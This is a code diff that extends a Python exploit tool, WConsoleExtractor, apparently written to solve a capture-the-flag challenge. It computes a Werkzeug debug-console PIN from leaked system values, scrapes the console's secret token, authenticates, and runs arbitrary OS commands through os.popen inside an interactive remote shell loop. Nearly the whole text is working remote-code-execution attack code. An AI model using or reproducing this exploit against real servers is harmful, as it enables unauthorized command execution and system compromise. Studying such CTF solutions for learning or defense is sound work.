@@ -3,6 +3,8 @@ from urllib.parse import urlsplit
 import re
 import hashlib
 from itertools import chain
+from bs4 import BeautifulSoup as bs
+import sys
 
 def error(message=""):
     print(f"[ERROR] {message}")
@@ -70,6 +72,11 @@ class WConsoleExtractor:
             self.uuidnode,
             self.machine_id
         ]
+
+        self.pin_code = WConsoleExtractor.compute_pin(self.probably_public_bits, self.private_bits)
+        self.token = self.get_token()
+
+
     
     def get(self, path:str):
         return self.sess.get(f"{self.base_url}{path}")
@@ -92,12 +99,21 @@ class WConsoleExtractor:
         headers = self.get_headers()
         return headers.get("Server")
     
+    def input(self):
+        # inp = sys.stdin.readline()
+        #return inp.strip()
+        return input()
+    
+    def print(self, message=""):
+        # sys.stdout.write(message)
+        print(message, end="")
+    
     # Leaks
     def choose_username(self, etc_passwd:str):
         usernames = []
         for line in etc_passwd.splitlines():
             username = self.etc_passwd_regex.findall(line)[0]
-            print(f"{len(usernames)} : {username}")
+            self.print(f"{len(usernames)} : {username}\n")
             usernames.append(username)
 
         answer = -1
@@ -168,6 +184,47 @@ class WConsoleExtractor:
                 rv = num
 
         return rv
+    
+    def get_token(self):
+        token_request = self.get("/console")
+        token = re.findall(r'SECRET = "(.+)";', token_request.text)
+
+        if len(token) == 0:
+            error("Error while finding token")
+
+        return token[0]
+
+    def exec_cmd(self, cmd):
+        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
+        self.get(authent_path)
+
+        url = f"/console?__debugger__=yes&cmd=__import__('os').popen('{cmd}').read()&frm=0&s={self.token}"
+        res = self.get(url)
+
+        if res.status_code == 404:
+            error("Error while sending command")
+            return
+        
+        soup = bs(res.text, 'html.parser')
+        span = soup.find("span")
+        if span:
+            output = span.contents[0].replace("'", "").replace("\\n", "\n")
+        else:
+            output = "This command returned no output"
+
+        return output.strip()
+    
+    def shell(self):
+        exit_commands = ["exit", "quit", "q"]
+        cmd = ""
+
+        while cmd not in exit_commands:
+            pwd = self.exec_cmd("pwd")
+            self.print(f"{pwd}$ ")
+            cmd = self.input()
+
+            self.print(f"{self.exec_cmd(cmd)}\n")
+
 
 
 from bs4 import BeautifulSoup as bs
@@ -185,3 +242,5 @@ extractor = WConsoleExtractor(
     "https://chall-hosting.0xhorizon.eu",
     leak_file
 )
+
+extractor.shell()
